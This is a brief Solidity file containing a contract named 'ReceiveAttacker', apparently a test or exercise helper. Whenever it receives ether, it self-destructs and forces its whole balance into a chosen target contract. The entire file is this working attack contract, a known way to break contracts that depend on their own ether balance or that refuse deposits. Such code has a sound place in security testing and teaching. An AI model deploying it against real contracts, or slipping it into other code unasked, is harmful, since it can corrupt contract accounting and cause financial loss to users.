pragma solidity ^0.8.0;

contract ReceiveAttacker {
    address public immutable target;

    constructor(address _target) {
        target = _target;
    }

    receive() external payable {
        selfdestruct(payable(target));
    }
}